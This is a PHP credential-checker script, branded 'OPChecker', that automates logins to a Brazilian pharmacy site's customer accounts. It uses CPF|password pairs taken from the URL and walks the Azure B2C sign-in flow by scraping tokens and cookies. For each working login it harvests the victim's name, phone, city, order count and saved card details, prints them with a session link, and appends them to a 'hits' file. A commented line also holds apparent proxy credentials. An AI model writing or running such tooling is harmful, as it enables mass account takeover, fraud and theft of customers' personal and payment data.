<?php

#==============================================================================================#
error_reporting(0);
set_time_limit(0);
#==============================================================================================#

#==============================================================================================#

$loadtime = time();
$dataehora = date("F j, Y, h:i:s a");

function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}




extract($_GET);
$lista = str_replace(" ", "", $lista);
$separar = explode("|", $lista);
$cpf = $separar[0];
$senha = $separar[1];
$lista = ("$cpf|$senha");



//$proxyServer = "http://sikeira2052-zone-resi-region-br:sikeira2052@pr.pyproxy.com:16666";



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers[] = 'Cookie: _ENV["guesttoken=a1f81e1f2b5c476e8fa6c878d7d8f5c0; carttoken=a1f81e1f2b5c476e8fa6c878d7d8f5c0;"]';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'referer: https://raiaextprd.b2clogin.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$a1 = curl_exec($ch);
####################################################
$buildid = getStr($a1, '"buildId":"', '"');
$carttoken = getStr($a1, ',"cartToken":"', '","');
####################################################



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/_next/data/' .$buildid. '/customer/account/login.json');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.drogaraia.com.br';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Accept: */*';
$headers[] = 'Referer: https://www.drogaraia.com.br/';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$a2 = curl_exec($ch);

$key = getStr($a2, 'client_id=','&');
//$carttoken = getStr($a2, 'cartToken":"','"');
$linklogin = getStr($a2, '__N_REDIRECT":"','"');

//$key."<BR>".$carttoken."<br>".$linklogin;

####################################################


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $linklogin);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HEADER, 1);
$headers = array();
$headers[] = 'Host: raiaextprd.b2clogin.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'Referer: https://www.drogaraia.com.br/';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$a3 = curl_exec($ch);

####################################################
$sso = getStr($a3, 'x-ms-cpim-sso:raiaextprd.onmicrosoft.com_0=',';');
$csrf = getStr($a3, 'x-ms-cpim-csrf=',';');
$cache = getStr($a3, 'x-ms-cpim-cache',';');
$trans = getStr($a3, 'x-ms-cpim-trans=',';');
####################################################

####################################################
$stateproperties = getStr($a3, '"transId":"','"');
####################################################

$key."<BR>".$carttoken."<br>".$linklogin."<br>".$stateproperties;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raiaextprd.b2clogin.com/raiaextprd.onmicrosoft.com/B2C_1A_Signin/SelfAsserted?tx='.$stateproperties.'&p=B2C_1A_Signin');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "request_type=RESPONSE&signInName=$cpf&password=$senha");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: raiaextprd.b2clogin.com';
$headers[] = 'X-Csrf-Token: '.$csrf.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'Origin: https://raiaextprd.b2clogin.com';
$headers[] = 'Referer: '.$linklogin.'';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Cookie: x-ms-cpim-sso:raiaextprd.onmicrosoft.com_0='.$sso.'; x-ms-cpim-csrf='.$csrf.'; x-ms-cpim-cache'.$cache.'; x-ms-cpim-trans='.$trans.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$logar = curl_exec($ch);

####################################################
$cache_logar = getStr($logar, 'x-ms-cpim-cache',';');
####################################################
$status = getStr($logar, '"status":"','"');
$messagem = getStr($logar, '"message":"','"');
####################################################
$retorno_logar = "Status:" .$status." Return: ".$messagem;

if (strpos($logar, 'status":"200')) {

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raiaextprd.b2clogin.com/raiaextprd.onmicrosoft.com/B2C_1A_Signin/api/CombinedSigninAndSignup/confirmed?rememberMe=false&csrf_token='.$csrf.'&tx='.$stateproperties.'&p=B2C_1A_Signin&diags=%7B%22pageViewId%22%3A%221d8538eb-aeef-4bde-a410-0fc2cc0263a3%22%2C%22pageId%22%3A%22CombinedSigninAndSignup%22%2C%22trace%22%3A%5B%7B%22ac%22%3A%22T005%22%2C%22acST%22%3A1725496725%2C%22acD%22%3A3%7D%2C%7B%22ac%22%3A%22T021%20-%20URL%3Ahttps%3A%2F%2Fbr-drogaraia-template-oauth.s3.amazonaws.com%2Fprod%2Fsite%2Flatest%2Flogin%2Findex.html%22%2C%22acST%22%3A1725496725%2C%22acD%22%3A719%7D%2C%7B%22ac%22%3A%22T019%22%2C%22acST%22%3A1725496726%2C%22acD%22%3A6%7D%2C%7B%22ac%22%3A%22T004%22%2C%22acST%22%3A1725496726%2C%22acD%22%3A4%7D%2C%7B%22ac%22%3A%22T003%22%2C%22acST%22%3A1725496726%2C%22acD%22%3A2%7D%2C%7B%22ac%22%3A%22T035%22%2C%22acST%22%3A1725496727%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T030Online%22%2C%22acST%22%3A1725496727%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T002%22%2C%22acST%22%3A1725496736%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T018T010%22%2C%22acST%22%3A1725496735%2C%22acD%22%3A684%7D%5D%7D');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: raiaextprd.b2clogin.com';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'Referer: '.$linklogin.'';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Cookie: x-ms-cpim-sso:raiaextprd.onmicrosoft.com_0='.$sso.'; x-ms-cpim-csrf='.$csrf.'; x-ms-cpim-cache'.$cache_logar.'; x-ms-cpim-trans='.$trans.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$logou = curl_exec($ch);

$link_acesso = getStr($logou, '<a href="','">here');

####################################################
$acess_token = getStr($logou, 'access_token=','&amp');
$code_token = getStr($logou, 'code=','"');
####################################################



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/api/next/callback-login?access_token='.$acess_token.'&token_type=Bearer&expires_in=86400&code='.$code_token.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.drogaraia.com.br';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'Referer: https://raiaextprd.b2clogin.com/';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=0, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$setar_tokens = curl_exec($ch);

####################################################
$acess_token_final = getStr($setar_tokens, 'access_token=',';');
$token_tagify = getStr($setar_tokens, 'token_tagify=',';');
$refresh_token_final = getStr($setar_tokens, 'refresh_token=',';');
####################################################



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/api/next/middlewareGraphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"variables":{},"query":"mutation activateLogin {\n  activateLogin {\n    hasCart\n    token\n    vucCode\n    __typename\n  }\n}\n","operationName":"activateLogin"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.drogaraia.com.br';
$headers[] = 'Cookie: access_token='.$acess_token_final.'; token_tagify='.$token_tagify.'; refresh_token='.$refresh_token_final.'';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Google Chrome\";v=\"128\"';
$headers[] = 'Accept: */*';
$headers[] = 'Sec-Ch-Ua-Platform: \"Windows\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://www.drogaraia.com.br';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://www.drogaraia.com.br/customer/account/loginSuccess';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$activate_code_authentic = curl_exec($ch);

####################################################
$activate_token = getStr($activate_code_authentic, '"token":"','"');
####################################################

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/api/next/middlewareGraphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"variables":{},"query":"query getCustomer {\n  customer {\n    id\n    dob\n    email\n    firstname\n    lastname\n    gender\n    taxvat\n    extension_attributes {\n      is_subscribed\n      telephone\n      cellphone\n      __typename\n    }\n    addresses {\n      postcode\n      street\n      default_billing\n      default_shipping\n      __typename\n    }\n    __typename\n  }\n}\n","operationName":"getCustomer"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.drogaraia.com.br';
$headers[] = 'Cookie: access_token='.$acess_token_final.'; token_tagify='.$token_tagify.'; refresh_token='.$refresh_token_final.'';
$headers[] = 'Accept: */*';
$headers[] = 'X-Session-Customer: '.$activate_token.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://www.drogaraia.com.br';
$headers[] = 'Referer: https://www.drogaraia.com.br/customer/account/loginSuccess';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$dados = curl_exec($ch);

####################################################
$nome = getStr($dados, '"firstname":"','"');
$numero = getStr($dados, '"cellphone":"','"');
$cep = getStr($dados, '"postcode":"','"');
####################################################


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/api/next/middlewareGraphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"getOrders","variables":{"pageSize":10,"currentPage":1},"query":"query getOrders($pageSize: Int!, $currentPage: Int!) {\n  orders(input: {pageSize: $pageSize, currentPage: $currentPage}) {\n    items {\n      current_status\n      current_statusId\n      isHybrid\n      increment_id\n      status\n      created_at\n      custom_grand_total\n      __typename\n    }\n    page_info {\n      current_page\n      page_size\n      total_pages\n      total_count\n      __typename\n    }\n    __typename\n  }\n}\n"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.drogaraia.com.br';
$headers[] = 'Cookie: access_token='.$acess_token_final.'; token_tagify='.$token_tagify.'; refresh_token='.$refresh_token_final.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: */*';
$headers[] = 'X-Session-Customer: '.$activate_token.'';
$headers[] = 'Origin: https://www.drogaraia.com.br';
$headers[] = 'Referer: https://www.drogaraia.com.br/sales/order/history';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$pedidos = curl_exec($ch);

####################################################
$total_pedidos = getStr($pedidos, 'total_count":',',');
####################################################


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/api/next/middlewareGraphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"variables":{},"query":"{\n  cards: cardsV2 {\n    id\n    nameCard\n    number\n    type\n    default\n    __typename\n  }\n}\n"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.drogaraia.com.br';
$headers[] = 'Cookie: access_token='.$acess_token_final.'; token_tagify='.$token_tagify.'; refresh_token='.$refresh_token_final.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: */*';
$headers[] = 'X-Session-Customer: '.$activate_token.'';
$headers[] = 'Origin: https://www.drogaraia.com.br';
$headers[] = 'Referer: https://www.drogaraia.com.br/paymentfront/customer_creditcard';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$cartao = curl_exec($ch);

// Decodificar o JSON para um array PHP
$data = json_decode($cartao, true);

// Verificar se a decodificação foi bem-sucedida
if ($data === null) {
    die("Erro ao decodificar o JSON");
}

// Acessar a lista de cartões
$cards = $data['data']['cards'];

// Contar o número de cartões
$cardCount = count($cards);

// Armazenar o valor em uma variável
$variavelCartoes = $cardCount;




####################################################
$num_cartao = getStr($cartao, 'number": "','"');
$tipo_cartao = getStr($cartao, '"type": "','"');
####################################################
$retorno_cartao = "final:" .$num_cartao." - ".$tipo_cartao;


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.drogaraia.com.br/api/next/middlewareGraphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"variables":{},"query":"{\n  shippingAddress {\n    id\n    customer_id\n    region_id\n    country_id\n    street\n    company\n    telephone\n    fax\n    postcode\n    city\n    firstname\n    middlename\n    lastname\n    prefix\n    suffix\n    vat_id\n    default_shipping\n    default_billing\n    region {\n      region_code\n      region\n      region_id\n      __typename\n    }\n    __typename\n  }\n}\n"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.drogaraia.com.br';
$headers[] = 'Cookie: access_token='.$acess_token_final.'; token_tagify='.$token_tagify.'; refresh_token='.$refresh_token_final.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: */*';
$headers[] = 'X-Session-Customer: '.$activate_token.'';
$headers[] = 'Origin: https://www.drogaraia.com.br';
$headers[] = 'Referer: https://www.drogaraia.com.br/sales/order/history';
$headers[] = 'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7';
$headers[] = 'Priority: u=1, i';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$endereco = curl_exec($ch);

####################################################
$data = json_decode($endereco, true);
$city = '';
$state = '';

foreach ($data['data']['shippingAddress'] as $address) {
    if ($address['default_shipping']) {
        $city = $address['city'];
        $state = $address['region']['region_code']; // O estado está em 'region_code'
        break; // Não é necessário continuar após encontrar o endereço
    }else{
        $city = $address['city'];
        $state = $address['region']['region_code'];
        break;
    }
}
####################################################

echo '
    <font color=green><b>#Aprovada ✔</b></font> 
    <b> <span class="badge badge-success"> CPF: '.$cpf.'|'.$senha.' ➜ N.: '.$nome.' | Cel: '.$numero.' | Cid.: '.$city.'-'.$state.' | Pedidos: '.$total_pedidos.' | Cartões: '.$variavelCartoes.' | Link: <a href="'.$link_acesso.'" target="_blank">Abrir </a> </b></span> 
    <span class="badge badge-warning"> ➜ <b> ⏳ '.(time() - $loadtime).' seg  </b></span>
    <span class="badge badge-dark"> <b> © OPChecker </b></span>
   ';

    $file = fopen("salvos/Aprovadas.txt", "a");
    fwrite($file, "#Aprovada  - EMAIL: $cpf|senha | Nome: $nome | Cel: $numero | Cidade: $city-$state | Pedidos: $total_pedidos | cartao: $retorno_cartao #OPC\r\n");
    exit();




}


else{


 echo '
    <font color=green><b>#Reprovada ❌</b></font> 
    <b> <span class="badge badge-danger"> CPF: '.$cpf.'|'.$senha.' </b></span>
    <b> <span class="badge badge-danger"> '.$retorno_logar.' </b></span>
    <span class="badge badge-warning"> ➜ <b> ⏳ '.(time() - $loadtime).' seg  </b></span>
    <span class="badge badge-dark"> ➜<b> © OPChecker </b></span>
   ';

    $file = fopen("salvos/Reprovadas.txt", "a");
    fwrite($file, "#Reprovada  - [$cc|$mes|$ano|$cvv] #OPC\r\n");
    exit();

}

?>